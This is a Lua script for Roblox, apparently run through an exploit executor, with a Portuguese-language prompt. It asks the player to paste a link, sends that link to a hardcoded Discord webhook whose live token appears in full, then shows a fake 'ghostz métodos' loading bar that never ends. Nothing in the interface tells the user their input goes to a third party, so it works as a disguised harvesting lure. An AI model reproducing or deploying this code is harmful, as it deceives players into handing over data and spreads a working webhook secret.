local WEBHOOK_URL = "https://discord.com/api/webhooks/1446315165501886549/ZAIwt-MEl6esV4AH_V1QzOQUPVlOGOH2o6qCx7aFe_r2jbocmpEL7Tk5AFFBdJXSnVEr"
local HttpService = game:GetService("HttpService")

local function SendWebhook(msg)
    local data = {content = msg}
    local jsonData = HttpService:JSONEncode(data)

    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.fromOffset(300,150)
Frame.Position = UDim2.fromScale(0.5,0.5)
Frame.AnchorPoint = Vector2.new(0.5,0.5)
Frame.BackgroundColor3 = Color3.new(1,1,1)
Frame.Parent = ScreenGui

local Label = Instance.new("TextLabel")
Label.Size = UDim2.new(1,0,0,30)
Label.BackgroundTransparency = 1
Label.Text = "Digite o link:"
Label.TextColor3 = Color3.new(0,0,0)
Label.TextSize = 18
Label.Font = Enum.Font.GothamBold
Label.Parent = Frame

local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(1,-20,0,35)
TextBox.Position = UDim2.fromOffset(10,40)
TextBox.BackgroundColor3 = Color3.new(1,1,1)
TextBox.TextColor3 = Color3.new(0,0,0)
TextBox.PlaceholderText = "https://..."
TextBox.Parent = Frame

local Button = Instance.new("TextButton")
Button.Size = UDim2.new(1,-20,0,35)
Button.Position = UDim2.fromOffset(10,90)
Button.BackgroundColor3 = Color3.fromRGB(0,120,255)
Button.TextColor3 = Color3.new(1,1,1)
Button.Text = "Enviar"
Button.TextSize = 18
Button.Font = Enum.Font.GothamBold
Button.Parent = Frame

Button.MouseButton1Click:Connect(function()
    local texto = TextBox.Text

    if texto ~= "" then
        SendWebhook("🔗 Link enviado: " .. texto)

        -- feedback
        Button.Text = "Enviado!"

        wait(1)

        -- remove interface
        ScreenGui:Destroy()
        
        local LoadGui = Instance.new("ScreenGui")
        LoadGui.Parent = game.CoreGui
        LoadGui.IgnoreGuiInset = true

        local Background = Instance.new("Frame")
        Background.Size = UDim2.fromScale(1,1)
        Background.BackgroundColor3 = Color3.new(0,0,0)
        Background.Parent = LoadGui

        local Title = Instance.new("TextLabel")
        Title.AnchorPoint = Vector2.new(0.5,0)
        Title.Position = UDim2.fromScale(0.5,0.2)
        Title.Size = UDim2.fromScale(0.8,0.1)
        Title.BackgroundTransparency = 1
        Title.Text = "ghostz métodos"
        Title.TextColor3 = Color3.new(1,1,1)
        Title.TextSize = 38
        Title.Font = Enum.Font.GothamBlack
        Title.Parent = Background

        local BarContainer = Instance.new("Frame")
        BarContainer.AnchorPoint = Vector2.new(0.5,0.5)
        BarContainer.Position = UDim2.fromScale(0.5,0.6)
        BarContainer.Size = UDim2.fromOffset(400,12)
        BarContainer.BackgroundColor3 = Color3.fromRGB(30,30,30)
        BarContainer.Parent = Background

        local Bar = Instance.new("Frame")
        Bar.Size = UDim2.fromOffset(100,12)
        Bar.Position = UDim2.fromOffset(-100,0)
        Bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
        Bar.Parent = BarContainer

        spawn(function()
            while LoadGui.Parent do
                Bar:TweenPosition(
                    UDim2.fromOffset(400,0),
                    Enum.EasingDirection.Out,
                    Enum.EasingStyle.Sine,
                    1.2,
                    true
                )
                wait(1.2)
                Bar.Position = UDim2.fromOffset(-100,0)
            end
        end)
    else
        Button.Text = "Digite algo!"
        wait(1)
        Button.Text = "Enviar"
    end
end)
